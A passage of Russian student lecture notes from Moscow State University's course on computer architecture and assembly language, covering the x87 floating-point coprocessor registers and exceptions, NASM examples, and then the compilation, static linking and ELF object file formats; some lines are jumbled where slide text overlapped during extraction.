до 7 идут разряды, показывающие наличие тех или иных ситуаций, возникших в ходе
вычислений. Интересно то, что теперь у нас появляется возможность реагировать на
возникающие прерывания. Схематичное представление на рисунке 16.1.




                                                                                                   2

                                  Рис. 16.1: Регистр состояния сопроцессора x87.

   Сверху вниз происходит течение времени. Будем считать, что присутствует только
одно процессорное ядро, которое выполняет поток команд. Изобразим программу в
виде непрерывной линии. В какой-то момент произошло какое-то взаимодействие
процессора с внешним миром, например начало работу устройство ввода-вывода. В этот
момент происходит системное прерывание. Это означает, что аппаратура, получив
электрический импульс, способна передать управление на какой-то совсем другой код,
который выполняет служебную функцию. Этот служебный код называется обработчик
прерывания. Диаграмма изображена на рисунке 16.2
   Обработчик вызывается не командами, а просто из ранее заполненных служебных
регистров вытаскиваются определённые адреса, начиная с которых находится функции,
реагирующие на возникшее событие. Обработчик может отдать управление обратно
программе.


                                                       173
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                   КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                        ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                         СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                              Программа      Обработчик




                                          t

                                  Рис. 16.2: Иллюстрация системного прерывания.


     Механизм прерываний используется и как реакция на какой-то сбой. Например, при
 сбое в программе, управление также передаётся на обработчик. Обработчик решает, что
 делать с проблемой, он может завершить работу программы или сделать что-то другое.
     В регистре состояния фактически может возникнуть 8 состояний, когда что-то пошло
 не так. На рисунке 16.1 синим отмечены флаги исключительных ситуаций, а персиковым
- сбои работы со стеком. Сбои стека - это переполнения в одну или в другую сторону. Сам
 ход вычислений имеет не такие однозначные сбои.
     В документации традиционно мнемоники исключений начинаются с решётки, а далее
 идёт некий мнемонический символ. Запишем некоторые коды исключительных ситуаций
 и их расшифровки:

                                  #I             inv - invalid operation
                                  #Z                деление на нуль
                                  #P   потеря точности (результат был округлён)
                                  #U                    underflow
                                  #O                     overflow
                                  #D           операнд денормализован

   Как видно, некоторые исключения могут возникать в штатных ситуациях и довольно
часто.
   Команда FINIT выставляет в регистр состояния нули.




                                                      174
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                              КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                   ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                    СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU


                                                                                         © 2021 МГУ/ВМК/СП
Управляющий регистр
                                    Управляющий регистр
   Младшие 6 разрядов по сути управляют реакцией на исключения из регистра
состояния. То есть, если в маске стоит единичка, то соответствующая исключительная
ситуация игнорируется. В самом начале FINIT выставляет во все разряды единички. То
есть, по • Точность:
         умолчанию     одинарная,
                    исключения      двойная,Также
                               игнорируются.   расширенная
                                                     присутствуют поля, управляющие
         • Округление:    к ближайшему      четному,
точностью и округлением. По умолчанию FINIT выставляет к нулю,
                                                             нули в поле округления,
           к +/- бесконечности
что означает округление к ближайшему чётному. В поле точности по умолчанию
         • Флаг X – совместимость с 287
устанавливаются две единицы, что означает использование расширенной точности при
         • Маски
вычислениях.       соответствуют
              Схематичное            исключениям
                           изображение               в слове
                                        регистра на рисунке   состояния
                                                            16.3.




                                                                                                 3

                        Рис. 16.3: Схематичное изображение управляющего регистра.



Регистр признаков
   Регистр признаков показывает, что хранится в регистрах с данными. При
инициализации регистр заполняется единицами (16 штук). На каждый регистр с
числами приходится по два разряда. Эти два разряда кодируют содержимое регистров с
данными следующим образом:
   • 0 означает нормализованное число с плавающей точкой

   • 1 означает, что в регистре записан нуль

   • 2 означает, что в регистре записаны особые числа (такие как бесконечность)

   • 3 означает, что в регистр свободен
Таким образом, в начальном состоянии видно, что все регистры свободны.


NASM и числа с плавающей точкой
   При разработке программ, NASM предлагает поддержку чисел с плавающей точкой.
Можно задавать числа с различной точностью. Точность может быть одинарной,
половинной и другой. Все константы могут быть правильно закодированы.


                                                  175
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Тип double занимает 8 байт, таким образом dd превращается в dq. Если говорить
о расширенной точности, то это обозначается как dt. Зачастую двойной и одинарной
точности достаточно.
   Существуют специальные обозначения для бесконечностей, NaN тихого (он
игнорируется) и сигнального. Эти константы:
__Infinity__
__NaN__
__QNaN__
__SNaN__


Пример 1
    Разберём простой пример - сложение двух чисел. Первым делом вызывается команда
finit. Далее попробуем сложить два числа, которые определены и размещены в памяти.
Загнать эти числа в регистр сопроцессора можно только пересылкой из памяти, так как
исторически чип x87 находился отдельно на плате. Команда fld позволяет считывать из
памяти. Она имеет один операнд, который является памятью различного размера (32, 64,
80).
    После считывания второго числа - fld отработал два раза, у сопроцессора оказываются
заняты два регистра с числами. В регистре ST0 будет лежать число y, которое было
считано вторым, поэтому оно будет вершиной стека регистров. В регистре ST1 будет
лежать число x, которое было считано первым.
    Третья команда faddp. Она производит сложение верхних двух элементов, результат
отправляется в ST1, а TOP увеличивается на единицу, освобождая то, что раньше
находилось на верхушке стека. То есть, после сложения в регистре ST0 будет лежать
элемент x+y.
    Последний шаг - выгрузка результата в память. Для этого используется команда fstp,
причём буква p необязательна, она делает pop (снимает элемент со стека). Таким образом,
пересылка прошла. Итоговый код процедуры сложения:
CMAIN :
                   finit
                   fld dword [x]
                   fld dword [y]
                   faddp
                   fstp dword [z]
                   PRINT_HEX 4, z
                   NEWLINE
                   xor     eax , eax
                   ret


                                         176
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                              КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                   ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                    СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Теперь ничего не мешает выводить числа с плавающей точкой на печать. Можно
вызывать библиотечную функцию printf. Для этого, необходимо после выгрузки
скопировать результат в пространство аргументов перед вызовом функции printf. Стоит
обратить внимание на то, что при вызове функции с переменным числом параметров
есть одна особенность. Если величина скрыта за многоточием, то она всегда будет
приводиться к типу double для чисел с плавающей точкой. В данном же примере числа
имели формат float, поэтому необходимо поменять спецификатор размера (qword вместо
dword). Итоговый фрагмент кода, который выводит число на печать:
                   fst            dword [z]
                   fstp           qword [esp + 4]
                   mov            dword [esp], lc
                   call           printf
   Рассмотрим пример вычисления среднего арифметического четырёх чисел. Иногда
бывают ситуации, когда 8 регистров не хватает. Для улучшения ситуации сначала
приведём запись к польско-инверсной. То есть, было выражение:

                                           (𝑤 + 𝑥 + 𝑦 + 𝑧)/4                                       (16.1)

Стало:
                                            𝑤𝑥 + 𝑦 + 𝑧 + 4/                                        (16.2)

   Теперь выражение легко записать в коде:
                   fld     qword [w]
                   fld     qword [x]
                   faddp
                   fld     qword [y]
                   faddp
                   fld     qword [z]
                   faddp
                   fild    dword [d]
                   fdivp ; st1 / st0
                   ;...
    В конце необходимо превратить число в число с плавающей точкой (из 4 сделать 4.0).
Можно сохранить отдельно число 4 в памяти, а при загрузке использовать команду fild, а
не fld. Эта команда трактует свой операнд, как 16, 32 или 64 разряда, которые кодируют
целое число. В этот момент происходит конвертация и правильное перестроение битового
представления числа.
    Команда fdivp не имеет операндов, записывает в верхушку стека результат деления
регистров ST1 на ST0.


                                                 177
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Пример 2
   Пусть вычисления более сложные. На самом деле есть дерево, которое кодирует
вычисление выражения. Пусть корень дерева - это t, имеет двух потомков 𝑡1 и 𝑡2 . Пускай
для каждого потомка потребуется 𝑛1 и 𝑛2 регистров на стеке сопроцессора. Будем считать,
не ограничивая общности, что 𝑛1 < 𝑛2 . Это означает, что сначала можно выполнить
вычисления, связанные с 𝑛2 , результат сохраним в один регистров, а оставшихся
регистров точно хватит для вычисления 𝑛1 . В случае, если 𝑛1 = 𝑛2 , то потребуется не
𝑛2 регистров, а 𝑛2 + 1. Если регистров не будет хватать совсем, то придётся результаты
вычислений выгружать периодически в память.
   Рассмотренный ранее пример можно представить в виде дерева (рисунок 16.4). Тогда
видно, что достаточно будет двух регистров
                                  +




                                      w

                                               x

                                                               y                     z

          Рис. 16.4: Дерево вычисления среднего арифметического четырёх чисел.

   На самом деле, число необходимых регистров - это число Ершова. Рассмотренный
порядок вычислений - это упрощённый алгоритм распределения регистров Сети-
Ульмана.


Порядок действий
   Посмотрим на то, что происходит с самим результатом, когда меняется порядок
действий. Можно рассмотреть пример, в котором одно число очень большое, а второе
очень маленькое. При одном порядке сложений большее число “проглотит” меньшее.
Однако, можно поменять порядок действий, тогда результат получится другой. Пусть
есть три числа: x, y, z. Причём:

                                          𝑥 = 3.14,   𝑦 = 1𝑒50,    𝑧 = −1𝑒50                                (16.3)

   В одном случае сначала будем класть на стек y, потом z, а только потом x. Во втором
случае сначала положим на стек x, а затем y и z. В первом случае порядок сложения будет


                                                         178
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




таков:
                                     (𝑦 + 𝑧) + 𝑥                                          (16.4)

Первые два числа разные по знаку и очень большие. На выходе получим некое
приближение числа 𝜋.
   Во втором случае порядок вычисления будет таков:

                                     (𝑥 + 𝑧) + 𝑦                                          (16.5)

В данном случае результатом вычислений будет нуль.
   Аналогичная ситуация будет происходить и при распределении слагаемых.
Рассмотрим пример, когда имеется три очень больших одинаковых числа x, y, z. В
первом случае, когда вычисления идут в порядке:

                                      (𝑥 − 𝑦) · 𝑧                                         (16.6)

Результат будет нулевым.
   Во втором случае, когда скобки раскрыты, и вычисления идут в таком порядке:

                                     𝑥·𝑧−𝑦·𝑧                                              (16.7)

Результатом будет переполнение в двух произведениях. Вычитая одну бесконечность из
другой, получается NaN.
   Для того, чтобы избежать такого поведения, уберём маскирование обработки таких
вычислений. Это (изменить управляющий регистр) можно сделать с помощью двух
команд. Первая:
fstcw                 m16
fldcw                 m16
   Две команды с операндами, которые расположены в памяти 16 разрядов. Таким
образом, можно выгрузить текущее значение управляющего регистра, что-то с ним
сделать и загрузить обратно. Таким образом, второй способ, в котором происходит
переполнение, выведет теперь нас на аварийное завершение программы.


Дополнительные команды
   Для удобства заведено несколько команд, которые кладут на верхушку стека регистров
некоторые константы. Список этих команд (все без операндов):

   • FLD1 +1.0

   • FLDL2T 𝑙𝑜𝑔2 10



                                         179
         ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
         МАТЕМАТИКИ И КИБЕРНЕТИКИ
         МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • L2E 𝑙𝑜𝑔2 𝑒

   • FLDPI 𝜋

   • FLDLG2 𝑙𝑜𝑔10 2

   • FLDLN2 𝑙𝑜𝑔𝑒 2

   • FLDZ +0.0


Сравнение чисел
   Особенности сравнения также связаны с историческим аспектом отдельного
существования сопроцессора. Результаты сравнения будут запомнены в регистре
состояния. Вопрос в том, как результаты сравнения перенести на основной процессор
x86. Придётся копировать регистр состояния.
isLe
                    push           ebp
                    mov            ebp , esp
                    fld            dword [ebp +16]
                    fld            qword [ebp +8]
                    fucompp        ; St0 vs. St1
                    fnstsw         ax
                    sahf
                    setbe          al
                    pop            ebp
                    ret
   Команда для сравнения двух чисел - это fucompp. Две буквы p означают, что со
стека снимаются два элемента. Команда fnstsw производит сохранение в регистр, который
указан операндом. Далее, уже в процессоре x86 есть специальная команда sahf, которая
сохраняет старшие 8 разрядов ax внутрь EFLAGS.
   Такое поэтапное копирование и сравнение не очень удобно и позже была введена
специализированная команда fucomip, которая отправляет в EFLAGS напрямую. Однако,
она сбрасывает лишь один регистр, поэтому второй надо сбрасывать руками. Сложность
в том, что корректное состояние стека зависит от двух признаков, которые находятся
в разных местах. Один перезаписывается командой ffree регистра ST0, после чего
необходимо увеличить STP на единицу (fincstp).




                                                     180
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                  КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                       ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                        СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Дополнительные возможности работы сопроцессора
Условная пересылка

   В поколении Pentium PRO, в котором появилась функция fucomip, появились и
команды cmove. Это условная пересылка, которую возможно провернуть прямо на
регистрах процессора, не вовлекая напрямую регистр EFLAGS.

Возвращаемое значение - число с плавающей точкой

   В случае с целыми числами возврат идёт через регистр eax. В случае с плавающей
точкой на входе в функцию все регистры должны быть обязательно пустыми. Когда
выходим из функции, все регистры, кроме ST0 должны быть пустые, а в последнем
находиться возвращаемое значение.




                                      181
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
              Архитектура ЭВМ и язык ассемблера                                КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                   ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
              Падарян Вартан Андроникович                                      СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




              Лекция 17. Элементы системы программирования
              Система программирования
               Система программирования - это совокупность каких-то технических средств,
            программ, документации, которые позволяют программисту написать код, превратить
            его в работающие программы, а затем дают возможность этим  © 2021 программам
                                                                              МГУ/ВМК/СП работать в
            среде функционирования.
               Среда функционирования - это аппаратура и операционная система, которая
       Система программирования
            позволяет упростить взаимодействие с аппаратурой. Кроме компилируемых бывают
            интерпретируемые программы. Такие языки не превращаются в команды для процессора,
            а остаются в некотором высокоуровневом виде, которые потом исполняются другой
емные/прикладные
            программой. программы
               Для написания программ требуется комплекс средств, в том числе информационный
 ерационная система
 ограммныересурс.   Если брать то, что предлагают крупные производители, то этот инструмент
             средства   разработки
            называется SDK (Software Development Kit). Такой комплекс средств включает в себя
ема программирования             – комплекс
            документацию, библиотеки,           средств
                                       программные инструменты.
ык программирования
               Помимо инструментальной поддержки важен процесс создания программ -
  Информационные     ресурсы
            организация и жизненный цикл. Существуют несколько методологий разработки, которые
  Программные   инструменты
            в разном порядке включают в себя проектирование, реализацию, распространение и
  Библиотекисопровождение программных продуктов. Возможен такой вот линейный процесс
ы жизненного       цикла
            разработки,  хотяпрограммы
                                сейчас более популярна гибкая модель, которая позволяет
            подстраиваться под изменения. Одна из методологий упрощённо
 оектирование                                                             Пример: представлена на
                                                          разработка, управляемая
            схеме
  Сбор и анализ   17.1.
                требований    к программе                функциональностью (FDD)
  Разработка                                     Разработка     Разработка
                                                                               Планирование
ализация                                        архитектуры   списка функций

  Кодирование
  Отладка                                                        Дизайн
                                                                               Кодирование и
                                                                                тестирование
 провождение
                    Рис. 17.1: Упрощённая блок-схема одной методологии разработки программ.



              Система программирования языка Си
                 Основное инструментальное средство, организующее автоматизацию превращений
              программ, - это драйвер компилятора. В данном случае компилятор gcc. Рассмотрим
              основной “тракт”, по которому проходит Си программа (схематичное изображение
              всех этапов на рисунке 17.2). На входе имеется Си файл. Язык Си использует
              независимую компиляцию, то есть каждый отдельный файл проходит по всему



                                                                    182
                    ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
                    МАТЕМАТИКИ И КИБЕРНЕТИКИ
                    МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                         КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                              ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                               СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




тракту, а в определённом месте происходит слияние единиц трансляции. Сначала Си
файл раскрывается, производятся все макроподстановки (константы, мнемонические
имена, инклюды). Далее отрабатывает компилятор, который транслирует и компилирует
текст в ассемблерный листинг. Далее ассемблер переводит листинг в двоичный код.
Компоновщик позволят собрать несколько файлов с перемещаемым объектным кодом
и получить уже то, что почти может выполнять машина. Собирать вместе можно        даже
                                                                       © 2021 МГУ/ВМК/СП

написанные на разных языках файлы, главное соблюдать выравнивание и порядок
объявления функций.




       Рис. 17.2: Путь, по которому проходит программа, написанная на языке Си.

   После того, как был получен исполняемый файл, его нужно превратить              в то, что
                                                                      © 2021 МГУ/ВМК/СП

будет исполнять процессор. За это отвечает загрузчик - специальная программа, которая
превращает исполняемый файл, который лежит в файловой системе в то, что находится
                        Выполнение программы
в оперативной памяти. В этот момент программа уже окончательно докомпоновывается
(до этого происходила статическая компоновка кода, а тут происходит динамическая
компоновка). Схематично процесс изображён на рисунке 17.3.




        Рис. 17.3: Схема процесса выполнения программы с помощью загрузчика.

                                                                                      4



                                            183
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Компиляция
   Различные компоненты программы компилируются следующим образом:

   • Определения и объявления глобальных, статических и локальных статических
     переменных компилятор на уровне листинга (при построении ассемблерного
     листинга) превращает всё это в директивы, которые размещены в той или иной
     секции статических данных. Имена переменных превращаются в метки в той или
     иной секции.

   • Если определяется функция, то на уровне ассемблера по заданным правилам
     строится код. Начало функции соотносится с некоторой меткой, тело функции
     можно превратить в ассемблерный код.

   • Области видимости переменных в Си и в ассемблере отличаются. В Си по
     умолчанию всё оказывается в глобальной области видимости для всех единиц
     трансляции. В ассемблере в силу устоявшихся правил всё наоборот. В ассемблерном
     файле необходимо дописывать спецификаторы, чтобы на эту метку из другой
     единицы трансляции возможен был например прыжок.

   • При компиляции на Linux имена из Си кода остаются такими же. Однако, в других
     платформах возможно декорирование имён, например в Windows. Отметим, что в
     C++ возможна перегрузка функций, то есть они отличаются только параметрами.
     Таким образом, такие функции будут иметь имя в ассемблерном коде с суффиксом
     из параметров.


Схема работы ассемблера
   После того, как был получен ассемблерный листинг, необходимо перевести текстовую
запись в машинную. Казалось бы задача довольно простая, единственная сложность в
том, что в ассемблере присутствуют опережающие ссылки (например наверху происходит
jump на какую-то метку, которая появится сильно внизу). Решение - двойной проход.
За первый проход выстраивается частичная трансляция команд, оставив места для
заполнения там, где есть метки.
   Ассемблер формирует символ. Отличие от метки состоит в том, что помимо
имени, в символе хранится дополнительная информация (размер, видимость из других
модулей данной метки). Символы собираются в служебную структуру данных -
таблицу символов. Таким образом, на первом проходе строится таблица символов.
В других случаях, при обращении к меткам в других единицах трансляции например
подготовленную информацию о символах придётся сохранить в o-файле (расширение .o)
и дожидаться работы компоновщика, который соберёт это всё вместе.




                                       184
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                   КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                        ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                         СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Таким образом, объектный код включает в себя и содержимое секции и служебную
информацию.


Пример Си-программы
   Рассмотрим как все механизмы будут работать в Си-программе, состоящей из двух
единиц трансляции. Одна называется main.c, код:
int buf [2] = {1 , 2};
char str [] = " Hello ";
char *p = " world ";

int swap ( char *, char *);

int main ( int argc , char * argv [])
         if ( argc > 1) {
                  swap ( str , p);
         }
         return 0;
}
    Другая называется swap.c, код:
extern int buf [];

int * bufp0 = & buf [0];
static int * bufp1 ;
void swap () {
         int temp ;

                   bufp1 = & buf [1];
                   temp = * bufp0 ;
                   * bufp0 = * bufp1 ;
                   * bufp1 = temp ;
}
   Как видно, в обеих единицах трансляции размещены как функции, так и глобальные
данные, которые используются во всех единицах трансляции. Рассмотрим подробно,
как будет выглядеть объявление статических данных для файла main.c. Сначала нужно
объявить секцию (section data), куда будут помещены инициализированные переменные.
Переменная buf превратится в метку, Си строка запишется как есть, только в конце
необходимо добавить явным образом ноль. Необходимо добавить директиву global,



                                         185
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




так как это всё глобальные переменные. Третья глобальная переменная запишется
аналогично. Отметим, что последняя переменная (p) - это указатель, который ссылается
на некоторую метку, которая размещена в другой секции. На уровне кода вышеописанное
выглядит следующим образом:
section .data
        buf                       dd 1, 2
        str                       db `Hello '. 0
        p                         dd .L0
global buf
section .ROdata
        .L0                       db `world ', 0
    На уровне транслированного ассемблером содержимое секции будет представлять
собой массив байт. В начале будет находиться buf, потом будет str, затем два
неиспользуемых байта для выполнения требований по выравниванию. На правильно
выровненной границе появится указатель p, который будет ссылаться на точку L0. То,
что находится на этой точке - пока неизвестно, это можно будет доопределить только
потом.
    При обращении к метке будет зарезервирован один байт, так как это прыжок, и
необходимо закодировать его расстояние (считаем, что прыжок небольшой). В местах,
где происходит обращение к переменным, вызов функции, резервируется по 4 байта. Эти
байты связаны с именами меток. Для того, чтобы построить перемещаемый объектный
код, необходимо завести таблицу ссылок и таблицу символов. Эти две служебные
структуры данных хранят в себе информацию для вызова функции (откуда) и их имена.
Этот перемещаемый объектный код далее переходит на этап статической компоновки.


Статическая компоновка
   Компоновщик (в linux он называется ld) получает на вход откомпилированные
независимо друг от друга файлы с перемещаемым объектным кодом. В рассмотренном
примере компоновщик принимает два файла: main.o, swap.o. На выходе компоновщик
выдаёт исполняемый объектный файл.
   Зачем нужен компоновщик? Существует несколько причин, и все связаны с
эффективностью.

   • Разбивая программу на части, сокращается объём кода, который в рамках одного
     файла (единицы трансляции) находится у человека перед глазами. Есть правило, что
     увеличение объёма кода в два раза увеличивает сложность работы с ним в 4 раза.
     Поэтому удобно, когда программа разбивается на файлы относительно небольшого
     размера.



                                                   186
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Появляется возможность реализовывать библиотеки (повторное использование
     одного кода). Кроме того, таким образом экономится место на диске.

   • Раздельная компиляция уменьшает затрачиваемое время. Например, если
     изменилось что-то в одном файле, то нет необходимости перекомпилировать
     всё снова.

Что делает компоновщик

   Компоновка состоит из двух больших этапов.

  1. Первый шаг - это разрешение символов. На этапе трансляции были подготовлены
     служебные описания для символов. На устройствах, работающих на linux, каждый
     символ будет описываться структурой.
     typedef struct {
             int name ;
             int value ;
             int size ;
             char type :4 ,
             binding :4;
             char reserved ;
             char section ;
     } Elf_Symbol

     Такого набора полей должно хватать для того, чтобы однозначно соотнести
     каждое обращение (ссылку) с тем или иным определением, которые должны
     присутствовать в том наборе единиц трансляции, который подаётся на вход
     компоновщику.

  2. Второй шаг - это перемещение. В каждом модуле есть свой комплект секций,
     причём секции по именам будут зачастую повторяться. Почти в каждом модуле
     например будет секция текст. Секции будут собраны, объединены и размещены
     на некоторых адресах памяти. То есть, каждой собранной секции будет назначен
     абсолютный адрес, из которого она в памяти работающей программы будет
     видна. После объединения необходимо поправить обращения ко всем ссылкам,
     так как абсолютные адреса изменились. Такое переписывание ссылок называется
     перебазированием.
     Каждая ссылка уже описывается меньшим количеством полей, сохраняется только
     тип (type), номер символа в таблице (symbol) и смещение ссылки от начала той или
     иной секции, где эти ссылки были обнаружены (offset). Вся структура выглядит так:




                                        187
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




     typedef struct {
             int offset ;
             in symbol :24 ,
             type :8;
     } Elf32_Rel ;


Типы объектных файлов

   Существует три типа объектных файлов:

  1. Перемещаемые объектные файлы (.o - файлы). Код и данные содержатся в такой
     форме, что можно проводить компоновку с другими такими файлами.

  2. Исполняемые объектные файлы (код и данные в такой форме, что можно запускать
     выполнение программы)

  3. Разделяемые объектные файлы (.so - файлы). Это файлы, которые всплывают на
     этапе динамической компоновки (в windows - это .dll файлы). Эти объектные файлы
     вступают в работу уже в тот момент, когда программа запускается. В момент сборки
     на эти файлы смотрят только для того, чтобы узнать, какие в них содержатся данные
     и функции.

Executable and Linkable Format (ELF)

    Все описанные три типа файлов будут кодироваться и размещаться согласно единому
формату Executable and Linkable Format (ELF). Для linux (unix) систем это стандартный
бинарный формат объектных файлов. Это довольно старый формат. Файл ELF состоит
из “слоёв”. В начале и в конце имеет служебные данные, там содержится информация
о заголовках. Между ними находится закодированное двоичное содержимое тех секций,
которые были подготовлены во время сборки программы. Каждая секция - это ни что иное,
как массив. Полная структура представлена на картинке 17.4.
    Каждая секция представляет собой различную информацию, опишем некоторые из
них:

   • Заголовок содержит основную служебную информацию (размер машинного слова,
     тип файла, порядок байт) для спецификации архитектуры процессора например.

   • Нижняя таблица заголовков сегментов необходима при загрузке файла в память. Она
     не особо нужна для компоновщика.

   • Секция .text содержит код.




                                        188
